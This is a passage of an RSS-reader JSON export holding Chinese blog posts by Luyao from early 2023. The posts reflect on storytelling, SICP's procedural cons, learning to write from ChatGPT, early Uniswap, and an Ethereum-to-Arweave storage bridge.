          "category": "",
          "link": "https://zhangluyao.com/blog/observe_and_create/",
          "creator": "Luyao",
          "pubDate": "Sun, 30 Apr 2023 16:31:34 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "d2344d3f81e9e98a0ddc247b0db1a1b8",
          "highlights": []
        },
        {
          "title": "对讲故事的顿悟",
          "description": "<p>去年看到 wework 创始人做的那家新公司，搞住宅社区的，我就顿悟了“讲故事”这件事。</p>\n<p>当你讲了一个好故事，可能最后你自己的公司挂了，不要紧，还会有千千万万的其他人，继续去完成这件事，因为他们听到了你的故事。</p>\n<p>比如对于孙中山来说，某一次革命成不成，同盟会成不成，革命党成不成，可能都不重要了，重要的是他关于新中国的故事已经讲出去，他不做，别人也会做，会有人来完成这些事。</p>\n<p>每个人都活在他自己构建的主观世界里。如果大家都看到了同一个故事，那么这个故事就会发生。</p>\n",
          "content": "<p>去年看到 wework 创始人做的那家新公司，搞住宅社区的，我就顿悟了“讲故事”这件事。</p>\n<p>当你讲了一个好故事，可能最后你自己的公司挂了，不要紧，还会有千千万万的其他人，继续去完成这件事，因为他们听到了你的故事。</p>\n<p>比如对于孙中山来说，某一次革命成不成，同盟会成不成，革命党成不成，可能都不重要了，重要的是他关于新中国的故事已经讲出去，他不做，别人也会做，会有人来完成这些事。</p>\n<p>每个人都活在他自己构建的主观世界里。如果大家都看到了同一个故事，那么这个故事就会发生。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/story/",
          "creator": "Luyao",
          "pubDate": "Thu, 20 Apr 2023 16:24:54 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "887304fd3f385179bd31cef54b2c6b9b",
          "highlights": []
        },
        {
          "title": "直觉的意义",
          "description": "<p>上世纪的科学家在流体力学中发现了自相似性和递归性，但是当时并没有数学语言来描述这种现象，所以讲都没法讲。</p>\n<p>而对此最恰当的描述，居然是诗歌。史蒂文斯当时写过一些诗歌，其中有对于水流“在变化中重复自己”的准确观察。</p>\n<p>而且，这个发现湍流本质的科学家，最初居然也是从歌德那边获得的灵感。歌德从植物生长过程中，感受到了一种类似于“流”的存在，于是写了一本没多少人知道的书，叫《植物变形记》，正是这本书启发了利布沙贝关于湍流的本质。</p>\n<p>这几个事儿都很有趣，包括上次<a href=\"https://zhangluyao.com/blog/color\"  >关于颜色的理论</a>。</p>\n<p>对于科学家来说，如果科学不能描述的，等同于不科学、不存在。但对于艺术家来说，他们没有这种限制，<strong>他们只是用心观察世界，通过直觉捕捉到一些真实的东西</strong>。这些真理，往往要很久很久以后，才能被科学语言所解释。</p>\n",
          "content": "<p>上世纪的科学家在流体力学中发现了自相似性和递归性，但是当时并没有数学语言来描述这种现象，所以讲都没法讲。</p>\n<p>而对此最恰当的描述，居然是诗歌。史蒂文斯当时写过一些诗歌，其中有对于水流“在变化中重复自己”的准确观察。</p>\n<p>而且，这个发现湍流本质的科学家，最初居然也是从歌德那边获得的灵感。歌德从植物生长过程中，感受到了一种类似于“流”的存在，于是写了一本没多少人知道的书，叫《植物变形记》，正是这本书启发了利布沙贝关于湍流的本质。</p>\n<p>这几个事儿都很有趣，包括上次<a href=\"https://zhangluyao.com/blog/color\"  >关于颜色的理论</a>。</p>\n<p>对于科学家来说，如果科学不能描述的，等同于不科学、不存在。但对于艺术家来说，他们没有这种限制，<strong>他们只是用心观察世界，通过直觉捕捉到一些真实的东西</strong>。这些真理，往往要很久很久以后，才能被科学语言所解释。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/goethe/",
          "creator": "Luyao",
          "pubDate": "Wed, 29 Mar 2023 15:41:59 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "2b75454ee76734b7e57b02e6bd941ac9",
          "highlights": []
        },
        {
          "title": "向 chatGPT 学习写作",
          "description": "<p>我发现 chatGPT 真的有办法把文章改得更好读，我很好奇它是怎么做到的。于是我把我自己写的东西发给他，观察它如何修改。</p>\n<p><strong>首先，它通常会写得更长一点点，把我的省略掉的一些主语、宾语补上</strong>，或是替换掉它/他/她。尽管内容长了，但读起来其实更快了，因为读者的脑袋负担更小。</p>\n<p>比如这句话：</p>\n<blockquote>\n<p><em>你以为数据是有一个实体的，存在哪里，但挖到最后，发现<strong>它 tm 是一个过程</strong>。</em></p>\n</blockquote>\n<p>chatGPT 改后是这样的：</p>\n<blockquote>\n<p><em>我本以为数据是存在某个地方的实体，但在深入研究后，发现<strong>其实数据是一个过程</strong>。</em></p>\n</blockquote>\n<p>下面那个版本更顺畅易懂；相比之下，上面那个版本需要读者更加仔细地阅读，或者先对上下文有所了解。</p>\n<p><strong>其次，就是它会整理逻辑</strong>。有些地方，我可能都没有意识到我在语言上省略了一些逻辑。一段话和下一段话没有衔接，chatGPT 会补上这种衔接，使得逻辑很丝滑，易于理解。</p>\n<p>比如来自本文中的一段：</p>\n<blockquote>\n<p><em>作为普通读者，肯定是读下面那个版本更顺畅的；我上面的版本，需要读者更仔细地读，或是熟悉上下文。</em></p>\n</blockquote>\n<p>chatGPT 改后是这样的：</p>\n<blockquote>\n<p><em>普通读者肯定会发现下面那个版本更顺畅易懂；<strong>相比之下</strong>，上面那个版本需要读者更加仔细地阅读，或者先对上下文有所了解。</em></p>\n</blockquote>\n<p><strong>第三，它会使用不需要上下文，也比较好理解的词语</strong>。</p>\n<p><strong>第四，它使用更基础的动宾结构，而很少出现倒装、把字句之类的</strong>。</p>\n<p>比如来自本文的一段：</p>\n<blockquote>\n<p><em>它通常会写得更长一点点，<strong>把</strong>我的省略掉的一些主语、宾语<strong>补上</strong>。</em></p>\n</blockquote>\n<p>chatGPT 改后是这样的：</p>\n<blockquote>\n<p><em>chatGPT 通常会写得更长一些，<strong>补充</strong>我省略的主语和宾语。</em></p>\n</blockquote>\n<p>我觉得对于一个小学生、或母语不是中文的人而言，下面这个版本是更容易理解的。</p>\n",
          "content": "<p>我发现 chatGPT 真的有办法把文章改得更好读，我很好奇它是怎么做到的。于是我把我自己写的东西发给他，观察它如何修改。</p>\n<p><strong>首先，它通常会写得更长一点点，把我的省略掉的一些主语、宾语补上</strong>，或是替换掉它/他/她。尽管内容长了，但读起来其实更快了，因为读者的脑袋负担更小。</p>\n<p>比如这句话：</p>\n<blockquote>\n<p><em>你以为数据是有一个实体的，存在哪里，但挖到最后，发现<strong>它 tm 是一个过程</strong>。</em></p>\n</blockquote>\n<p>chatGPT 改后是这样的：</p>\n<blockquote>\n<p><em>我本以为数据是存在某个地方的实体，但在深入研究后，发现<strong>其实数据是一个过程</strong>。</em></p>\n</blockquote>\n<p>下面那个版本更顺畅易懂；相比之下，上面那个版本需要读者更加仔细地阅读，或者先对上下文有所了解。</p>\n<p><strong>其次，就是它会整理逻辑</strong>。有些地方，我可能都没有意识到我在语言上省略了一些逻辑。一段话和下一段话没有衔接，chatGPT 会补上这种衔接，使得逻辑很丝滑，易于理解。</p>\n<p>比如来自本文中的一段：</p>\n<blockquote>\n<p><em>作为普通读者，肯定是读下面那个版本更顺畅的；我上面的版本，需要读者更仔细地读，或是熟悉上下文。</em></p>\n</blockquote>\n<p>chatGPT 改后是这样的：</p>\n<blockquote>\n<p><em>普通读者肯定会发现下面那个版本更顺畅易懂；<strong>相比之下</strong>，上面那个版本需要读者更加仔细地阅读，或者先对上下文有所了解。</em></p>\n</blockquote>\n<p><strong>第三，它会使用不需要上下文，也比较好理解的词语</strong>。</p>\n<p><strong>第四，它使用更基础的动宾结构，而很少出现倒装、把字句之类的</strong>。</p>\n<p>比如来自本文的一段：</p>\n<blockquote>\n<p><em>它通常会写得更长一点点，<strong>把</strong>我的省略掉的一些主语、宾语<strong>补上</strong>。</em></p>\n</blockquote>\n<p>chatGPT 改后是这样的：</p>\n<blockquote>\n<p><em>chatGPT 通常会写得更长一些，<strong>补充</strong>我省略的主语和宾语。</em></p>\n</blockquote>\n<p>我觉得对于一个小学生、或母语不是中文的人而言，下面这个版本是更容易理解的。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/learn_writing_with_chatgpt/",
          "creator": "Luyao",
          "pubDate": "Sat, 25 Feb 2023 16:06:51 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "a08af9159fdb642367f8fad94710c920",
          "highlights": []
        },
        {
          "title": "SICP 的启发 2：无常",
          "description": "<p><img src=\"https://zhangluyao.com/images/sicp_impermanence/sicp_data_procedure.jpg\" alt=\"\"></p>\n<p>昨天的 <a href=\"https://zhangluyao.com/blog/sicp_empty/\"  >代码</a> 还让我意识到了一个重要的东西，那就是<strong>无常</strong>。</p>\n<p>在那个程序中，我本以为数据是存在某个地方的实体，但在深入研究后，发现其实数据是一个过程。唯一的数据就是用户输入的那个数据，这个输入会引发一系列的过程。</p>\n<p>这让我意识到，整个世界也可能就是这样一个程序：一个过程，其中不存在存储。<strong>当我们想象这个世界的源代码时，我们往往会认为数据存储在某个地方，但实际上并没有。</strong></p>\n<p>整个世界就像一根正在燃烧的导火线或者一支正在飞行的箭，最初可能只是有人输入了一个 “1”，触发了这个过程，然后一直持续到现在。</p>\n<p>所以，只有无常是永恒存在的，因为整个世界只是一个不断进行的过程，没有存储。</p>\n",
          "content": "<p><img src=\"https://zhangluyao.com/images/sicp_impermanence/sicp_data_procedure.jpg\" alt=\"\"></p>\n<p>昨天的 <a href=\"https://zhangluyao.com/blog/sicp_empty/\"  >代码</a> 还让我意识到了一个重要的东西，那就是<strong>无常</strong>。</p>\n<p>在那个程序中，我本以为数据是存在某个地方的实体，但在深入研究后，发现其实数据是一个过程。唯一的数据就是用户输入的那个数据，这个输入会引发一系列的过程。</p>\n<p>这让我意识到，整个世界也可能就是这样一个程序：一个过程，其中不存在存储。<strong>当我们想象这个世界的源代码时，我们往往会认为数据存储在某个地方，但实际上并没有。</strong></p>\n<p>整个世界就像一根正在燃烧的导火线或者一支正在飞行的箭，最初可能只是有人输入了一个 “1”，触发了这个过程，然后一直持续到现在。</p>\n<p>所以，只有无常是永恒存在的，因为整个世界只是一个不断进行的过程，没有存储。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/sicp_impermanence/",
          "creator": "Luyao",
          "pubDate": "Tue, 07 Feb 2023 23:50:33 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "18a43854b533c0aea07ed9dcb450edde",
          "highlights": []
        },
        {
          "title": "SICP 的启发 1：空",
          "description": "<p>1</p>\n<p>之前我听过一个 80 年代的计算机课程，叫 <a href=\"https://www.youtube.com/playlist?list=PLkEwH_Z2WOlppy8oUfrGwFVlOuKyo3RO_\"   target=\"_blank\" >SICP（计算机程序的构造和解释）</a>，很牛逼。</p>\n<p>其中印象最深的一节课是关于数据抽象 (abstraction) 的，一个我觉得挺复杂的问题，他仅仅是做了几层抽象的表示，问题就被解决了。我当时大为诧异，因为并没看到真正的“解决过程”。</p>\n<p><img src=\"https://zhangluyao.com/images/sicp_empty/sicp_empty.jpg\" alt=\"\"></p>\n<p>今天我把 <a href=\"https://youtu.be/ufTdeiz9dMw\"   target=\"_blank\" >那节课</a> 重听了一遍，听到了一个之前没注意的东西。</p>\n<p>他说 Lisp 中有一个基本的数据结构，叫做 CONS，它是由两个数据组成的一种结构，后续所有的抽象都是在这个基础上搭建的。</p>\n<p>结果，到了这节课最后，他讲了个惊人的东西。</p>\n<p>他说，我骗了你们，其实 Lisp 中并没有 CONS 这种结构，是我构造出来的。<strong>但当你们知道它是怎么被构造出来的，你们可能会被吓尿，因为它是从 “空” 中构造出来的</strong>。</p>\n<p>然后他展示了 CONS 的内部代码，只有三行，卧槽，你以为它内部是一个实体，其实并不是，它只是个过程！而且是一个看似没有意义的过程。</p>\n<pre tabindex=\"0\"><code>(define (cons a b)\n  (lambda (pick) \n    (cond ((= pick 1) a)\n          ((= pick 2) b))))\n</code></pre><p>类似于，“这个人叫路遥”，你以为 “这个人” 是个实体，结果你查看它的源代码，发现它的源代码上写着：“叫路遥”。</p>\n<p>他说他知道大家肯定会懵逼，所以就谎称有一种基础结构存在，让大家容易接受。但其实并不存在——</p>\n<blockquote>\n<p><strong>“很多人以为过程是一个行为，其实过程本身就是实体”</strong>。</p>\n</blockquote>\n<p>2</p>\n<p>这节课还教了一个非常有趣的思维方法，叫做 “wishful thinking”，它是抽象（abstraction）的精髓之一。</p>\n<p>它的意思是，当你想要设计一个东西时，可以先假设它已经存在了，比如想象成一朵云。然后你用这朵想象出来的云，来设计其他事物和它的交互方式。</p>\n<p>一旦你定义了它和其他事物的交互，这个东西本身的设计也就差不多完成了，因为这些交互已经定义了它的本质。</p>\n<p>换句话说，<strong>“一个事物的定义，取决于你和它交互的方式，而不是它的内部构造。”</strong>。</p>\n<p>3</p>\n<p>聊起这个，我的朋友 Maomao 告诉我，胡塞尔就是这个观点，你无法知道世界上其他人是不是 NPC。即对你来说，唯一的实体是你和其他客体的关系。你只能知道关系，不能知道客体。</p>\n<p>他这个观点之前一直被主流哲学界嘲笑，觉得你瞎搞，直到近代才被人理解。</p>\n<p>4</p>\n<p>当哲学家说这话的时候，别人可能觉得他故弄玄虚；但当你看到程序员写出这样的代码，然后正常 work，一切运行完好的时候，就很震惊。</p>\n<p>比如，有一个粒子，它和世界唯一的互动方式是，有人去测量它，它长 1 纳米。</p>\n<p>那么当你翻开它的源代码，它源代码很可能只有一行：</p>\n<blockquote>\n<p>“当有人测量我的时候，我就告诉他老子的长度是 1 纳米。”</p>\n</blockquote>\n<p>作为一个程序员，你看到这样的代码，会觉得，草，这么不负责任的代码，怎么可能构建出其他复杂的事物。</p>\n<p>但实际上，它真的可以。</p>\n<blockquote>\n<p><strong>“建立数据抽象并不需要数据，过程可以完成所有事情。”</strong></p>\n</blockquote>\n<p>佛教说“五蕴皆空”，今天这个事情很大地加深了我对 “空” 的理解，原来真的可以在空上建立东西。</p>\n",
          "content": "<p>1</p>\n<p>之前我听过一个 80 年代的计算机课程，叫 <a href=\"https://www.youtube.com/playlist?list=PLkEwH_Z2WOlppy8oUfrGwFVlOuKyo3RO_\"   target=\"_blank\" >SICP（计算机程序的构造和解释）</a>，很牛逼。</p>\n<p>其中印象最深的一节课是关于数据抽象 (abstraction) 的，一个我觉得挺复杂的问题，他仅仅是做了几层抽象的表示，问题就被解决了。我当时大为诧异，因为并没看到真正的“解决过程”。</p>\n<p><img src=\"https://zhangluyao.com/images/sicp_empty/sicp_empty.jpg\" alt=\"\"></p>\n<p>今天我把 <a href=\"https://youtu.be/ufTdeiz9dMw\"   target=\"_blank\" >那节课</a> 重听了一遍，听到了一个之前没注意的东西。</p>\n<p>他说 Lisp 中有一个基本的数据结构，叫做 CONS，它是由两个数据组成的一种结构，后续所有的抽象都是在这个基础上搭建的。</p>\n<p>结果，到了这节课最后，他讲了个惊人的东西。</p>\n<p>他说，我骗了你们，其实 Lisp 中并没有 CONS 这种结构，是我构造出来的。<strong>但当你们知道它是怎么被构造出来的，你们可能会被吓尿，因为它是从 “空” 中构造出来的</strong>。</p>\n<p>然后他展示了 CONS 的内部代码，只有三行，卧槽，你以为它内部是一个实体，其实并不是，它只是个过程！而且是一个看似没有意义的过程。</p>\n<pre tabindex=\"0\"><code>(define (cons a b)\n  (lambda (pick) \n    (cond ((= pick 1) a)\n          ((= pick 2) b))))\n</code></pre><p>类似于，“这个人叫路遥”，你以为 “这个人” 是个实体，结果你查看它的源代码，发现它的源代码上写着：“叫路遥”。</p>\n<p>他说他知道大家肯定会懵逼，所以就谎称有一种基础结构存在，让大家容易接受。但其实并不存在——</p>\n<blockquote>\n<p><strong>“很多人以为过程是一个行为，其实过程本身就是实体”</strong>。</p>\n</blockquote>\n<p>2</p>\n<p>这节课还教了一个非常有趣的思维方法，叫做 “wishful thinking”，它是抽象（abstraction）的精髓之一。</p>\n<p>它的意思是，当你想要设计一个东西时，可以先假设它已经存在了，比如想象成一朵云。然后你用这朵想象出来的云，来设计其他事物和它的交互方式。</p>\n<p>一旦你定义了它和其他事物的交互，这个东西本身的设计也就差不多完成了，因为这些交互已经定义了它的本质。</p>\n<p>换句话说，<strong>“一个事物的定义，取决于你和它交互的方式，而不是它的内部构造。”</strong>。</p>\n<p>3</p>\n<p>聊起这个，我的朋友 Maomao 告诉我，胡塞尔就是这个观点，你无法知道世界上其他人是不是 NPC。即对你来说，唯一的实体是你和其他客体的关系。你只能知道关系，不能知道客体。</p>\n<p>他这个观点之前一直被主流哲学界嘲笑，觉得你瞎搞，直到近代才被人理解。</p>\n<p>4</p>\n<p>当哲学家说这话的时候，别人可能觉得他故弄玄虚；但当你看到程序员写出这样的代码，然后正常 work，一切运行完好的时候，就很震惊。</p>\n<p>比如，有一个粒子，它和世界唯一的互动方式是，有人去测量它，它长 1 纳米。</p>\n<p>那么当你翻开它的源代码，它源代码很可能只有一行：</p>\n<blockquote>\n<p>“当有人测量我的时候，我就告诉他老子的长度是 1 纳米。”</p>\n</blockquote>\n<p>作为一个程序员，你看到这样的代码，会觉得，草，这么不负责任的代码，怎么可能构建出其他复杂的事物。</p>\n<p>但实际上，它真的可以。</p>\n<blockquote>\n<p><strong>“建立数据抽象并不需要数据，过程可以完成所有事情。”</strong></p>\n</blockquote>\n<p>佛教说“五蕴皆空”，今天这个事情很大地加深了我对 “空” 的理解，原来真的可以在空上建立东西。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/sicp_empty/",
          "creator": "Luyao",
          "pubDate": "Tue, 07 Feb 2023 22:40:29 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "9f0342c1440999dffab83fdc17f47cad",
          "highlights": []
        },
        {
          "title": "和俞昊然探讨“问题”",
          "description": "<p>我说，我感觉对问题的定义越清晰，最后的方案就越简单。</p>\n<p>他说：</p>\n<p>“因为后续要做设计，那设计就有两步，第一步是尽可能多的探索<strong>解空间</strong>，找各种各样可能的方案，还有一步就是从所有找到的方案中间做选择。”</p>\n<p>“而问题定义的清楚，实际上是<strong>把解空间给定义清楚了，知道边界</strong>在哪儿，这样子的话，我们会探索出来一些<strong>奇奇怪怪</strong>的东西。”</p>\n<p>“问题定义不清楚的话，往往你会把一些明明没必要去讨论的问题拿出来讨论，把一些不是解的解放到了未来的选择中间去，这样子的话效率就会很低。”</p>\n<p>“那如果<strong>问题拆解</strong>的好，也就是说，从本身的问题到各个子问题都定义清楚，那最终在这个把解拿出来的过程中间，每一个层次上的方案都是相对来说目标清晰，选择合理，那可能就是你说的简单。”</p>\n",
          "content": "<p>我说，我感觉对问题的定义越清晰，最后的方案就越简单。</p>\n<p>他说：</p>\n<p>“因为后续要做设计，那设计就有两步，第一步是尽可能多的探索<strong>解空间</strong>，找各种各样可能的方案，还有一步就是从所有找到的方案中间做选择。”</p>\n<p>“而问题定义的清楚，实际上是<strong>把解空间给定义清楚了，知道边界</strong>在哪儿，这样子的话，我们会探索出来一些<strong>奇奇怪怪</strong>的东西。”</p>\n<p>“问题定义不清楚的话，往往你会把一些明明没必要去讨论的问题拿出来讨论，把一些不是解的解放到了未来的选择中间去，这样子的话效率就会很低。”</p>\n<p>“那如果<strong>问题拆解</strong>的好，也就是说，从本身的问题到各个子问题都定义清楚，那最终在这个把解拿出来的过程中间，每一个层次上的方案都是相对来说目标清晰，选择合理，那可能就是你说的简单。”</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/define_problem2/",
          "creator": "Luyao",
          "pubDate": "Sun, 05 Feb 2023 13:52:24 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "d6049d19350142eb7185b64de9b51032",
          "highlights": []
        },
        {
          "title": "Hayden 的启发",
          "description": "<p>朋友给我发了一个<a href=\"https://twitter.com/ricburton/status/1620303792926507010?s=61&amp;t=IMEwMng7NFRqhwRo0RBO3w\"   target=\"_blank\" >故事</a>。作者讲述了他在 2018 年帮助 Hayden Adams，却错失投资机会的委屈故事。</p>\n<p>这个故事真正有趣的点在于，让我看到了早期 Uniswap 的真实状态，给了我许多启发。</p>\n<p><strong>1</strong></p>\n<p>比如，我之前以为 Uniswap 一开始就被以太坊基金会资助了，相当于含着金钥匙出生。但现在发现事实并非如此，Hayden 是完全靠自己的努力推进这个项目的，直到后来项目逐渐走上正轨，才有以太坊基金会和 Paradigm 参与进来。</p>\n<p>在此之前，Hayden 一再地花光钱，甚至在考虑是否要发行代币或者进行众筹。</p>\n<p>不只是团队人很少，就连相信这个项目的人也寥寥无几，作者说自己是除了 Hayden 外唯一一个真正相信 Uniswap 的人。</p>\n<!-- raw HTML omitted -->\n<!-- raw HTML omitted -->\n<p><strong>2</strong></p>\n<p>同样的，可以看到他对于自己的项目真的非常执着。</p>\n<p>当时 AMM 的概念并不新鲜，但 Hayden 看到一个关键：我们需要激励流动性，而且要简单到极致。</p>\n<p>作者说<strong>每次你遇到 Hayden，他肯定都是在跟你讲 Uniswap，他真的跟成百上千个人解释过这个交易系统</strong>。</p>\n<!-- raw HTML omitted -->\n<!-- raw HTML omitted -->\n<p><strong>3</strong></p>\n<p>作者在 18 年发过一张聚会的照片，说找找 builder 在哪里。</p>\n<p><img src=\"https://zhangluyao.com/images/hayden-2018/party.jpeg\" alt=\"\"></p>\n<p>结果我一看，别人都在 social，只有 hayden 一个人坐在沙发上写代码。其他照片也是，他要么在电脑前工作，要么就是在白板前讲东西。</p>\n<p><strong>4</strong></p>\n<p>我还注意到一句话，作者说他们有<strong>争论过，是做 “纯协议” 还是 “带一个 UI 界面”</strong>。</p>\n<blockquote>\n<p>I debated the strategy of protocol-only vs. controlling an interface.</p>\n</blockquote>\n<p>这让我一下子两眼放光，因为我也常琢磨这个问题。这让我很欣慰，或许很多困扰我的问题都没有一个理所当然的答案。</p>\n",
          "content": "<p>朋友给我发了一个<a href=\"https://twitter.com/ricburton/status/1620303792926507010?s=61&amp;t=IMEwMng7NFRqhwRo0RBO3w\"   target=\"_blank\" >故事</a>。作者讲述了他在 2018 年帮助 Hayden Adams，却错失投资机会的委屈故事。</p>\n<p>这个故事真正有趣的点在于，让我看到了早期 Uniswap 的真实状态，给了我许多启发。</p>\n<p><strong>1</strong></p>\n<p>比如，我之前以为 Uniswap 一开始就被以太坊基金会资助了，相当于含着金钥匙出生。但现在发现事实并非如此，Hayden 是完全靠自己的努力推进这个项目的，直到后来项目逐渐走上正轨，才有以太坊基金会和 Paradigm 参与进来。</p>\n<p>在此之前，Hayden 一再地花光钱，甚至在考虑是否要发行代币或者进行众筹。</p>\n<p>不只是团队人很少，就连相信这个项目的人也寥寥无几，作者说自己是除了 Hayden 外唯一一个真正相信 Uniswap 的人。</p>\n<!-- raw HTML omitted -->\n<!-- raw HTML omitted -->\n<p><strong>2</strong></p>\n<p>同样的，可以看到他对于自己的项目真的非常执着。</p>\n<p>当时 AMM 的概念并不新鲜，但 Hayden 看到一个关键：我们需要激励流动性，而且要简单到极致。</p>\n<p>作者说<strong>每次你遇到 Hayden，他肯定都是在跟你讲 Uniswap，他真的跟成百上千个人解释过这个交易系统</strong>。</p>\n<!-- raw HTML omitted -->\n<!-- raw HTML omitted -->\n<p><strong>3</strong></p>\n<p>作者在 18 年发过一张聚会的照片，说找找 builder 在哪里。</p>\n<p><img src=\"https://zhangluyao.com/images/hayden-2018/party.jpeg\" alt=\"\"></p>\n<p>结果我一看，别人都在 social，只有 hayden 一个人坐在沙发上写代码。其他照片也是，他要么在电脑前工作，要么就是在白板前讲东西。</p>\n<p><strong>4</strong></p>\n<p>我还注意到一句话，作者说他们有<strong>争论过，是做 “纯协议” 还是 “带一个 UI 界面”</strong>。</p>\n<blockquote>\n<p>I debated the strategy of protocol-only vs. controlling an interface.</p>\n</blockquote>\n<p>这让我一下子两眼放光，因为我也常琢磨这个问题。这让我很欣慰，或许很多困扰我的问题都没有一个理所当然的答案。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/hayden_2018/",
          "creator": "Luyao",
          "pubDate": "Thu, 02 Feb 2023 15:35:54 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "196090733333fd0d261fe3ae7b7b0245",
          "highlights": []
        },
        {
          "title": "计算和存储的桥梁",
          "description": "<p>我前一阵发了个推，说如果“计算”在 Ethereum，“存储”在 Arweave 或 IPFS，那中间少了点东西让它们彼此访问。但不知道为什么，从来没人讨论，也没人做这一块。</p>\n<p>我发的时候，脑海中还没有具体的使用场景，结果没过几天，就看到 Paradigm 的 <a href=\"https://twitter.com/transmissions11/status/1618810222663069696\"   target=\"_blank\" >t11s</a> 发推问大家有没有这样的东西。</p>\n<p><img src=\"https://zhangluyao.com/images/bridge/t11s.jpeg\" alt=\"\"></p>\n<p>网友问他要派什么用场？</p>\n<p>他说，他在做一个自己的 Rollup，有 &gt;50MB 的中间数据要存且要确保可访问，<strong>需要在合约层面验证这个数据哈希存在于 Arweave / IPFS 上</strong>。</p>\n<p>看吧，就这么简单一个事儿，现在居然是办不到的，你敢信……</p>\n<p>我相信这样的需求会越来越多。我们今天既没有人做、也没有人讨论这个事情，只是说明行业还处在一个非常原始的状态。</p>\n",
          "content": "<p>我前一阵发了个推，说如果“计算”在 Ethereum，“存储”在 Arweave 或 IPFS，那中间少了点东西让它们彼此访问。但不知道为什么，从来没人讨论，也没人做这一块。</p>\n<p>我发的时候，脑海中还没有具体的使用场景，结果没过几天，就看到 Paradigm 的 <a href=\"https://twitter.com/transmissions11/status/1618810222663069696\"   target=\"_blank\" >t11s</a> 发推问大家有没有这样的东西。</p>\n<p><img src=\"https://zhangluyao.com/images/bridge/t11s.jpeg\" alt=\"\"></p>\n<p>网友问他要派什么用场？</p>\n<p>他说，他在做一个自己的 Rollup，有 &gt;50MB 的中间数据要存且要确保可访问，<strong>需要在合约层面验证这个数据哈希存在于 Arweave / IPFS 上</strong>。</p>\n<p>看吧，就这么简单一个事儿，现在居然是办不到的，你敢信……</p>\n<p>我相信这样的需求会越来越多。我们今天既没有人做、也没有人讨论这个事情，只是说明行业还处在一个非常原始的状态。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/bridge/",
          "creator": "Luyao",
          "pubDate": "Sat, 28 Jan 2023 10:24:43 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "141d82d9d2b2e895cc51e5fdf2764499",
          "highlights": []
        },
        {
          "title": "送分题",
          "description": "<p>有一年我看 <a href=\"https://www.latepost.com/news/dj_detail?id=924\"   target=\"_blank\" >唐彬森</a> 的访谈，他在公司里管一类机会叫“<strong>送分题</strong>”。以前做互联网，别人卡顿，你做个不卡顿的，送分题。现在做饮料，看配料表能不能比别人好，用别人不敢用的好原料，送分题。</p>\n<p>最近搬到新家后，我发现许多昂贵的、高级的、智能的电器设备，我爸妈都不会用。把这些东西做得老人小孩都会用（像曾经一样），可能也是个送分题。</p>\n<p><em>（P.S. 这篇原本被我删掉了，因为说“把电器做好用”是送分题，有站着说话不腰疼的嫌疑。但后来我还是决定留在这里，因为我意识到，困难的送分题也是送分题，难道唐彬森说的这些送分题不困难吗。所谓送分题，只是解题思路简单，但不是谁都能解出来，没有经年累月的付出，也是拿不到那个分的。）</em></p>\n",
          "content": "<p>有一年我看 <a href=\"https://www.latepost.com/news/dj_detail?id=924\"   target=\"_blank\" >唐彬森</a> 的访谈，他在公司里管一类机会叫“<strong>送分题</strong>”。以前做互联网，别人卡顿，你做个不卡顿的，送分题。现在做饮料，看配料表能不能比别人好，用别人不敢用的好原料，送分题。</p>\n<p>最近搬到新家后，我发现许多昂贵的、高级的、智能的电器设备，我爸妈都不会用。把这些东西做得老人小孩都会用（像曾经一样），可能也是个送分题。</p>\n<p><em>（P.S. 这篇原本被我删掉了，因为说“把电器做好用”是送分题，有站着说话不腰疼的嫌疑。但后来我还是决定留在这里，因为我意识到，困难的送分题也是送分题，难道唐彬森说的这些送分题不困难吗。所谓送分题，只是解题思路简单，但不是谁都能解出来，没有经年累月的付出，也是拿不到那个分的。）</em></p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/free_money/",
          "creator": "Luyao",
          "pubDate": "Tue, 24 Jan 2023 11:06:36 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "7d07865cdbd0eeeed009418b6fdf0dd4",
          "highlights": []
        },
        {
          "title": "解决“问题”",
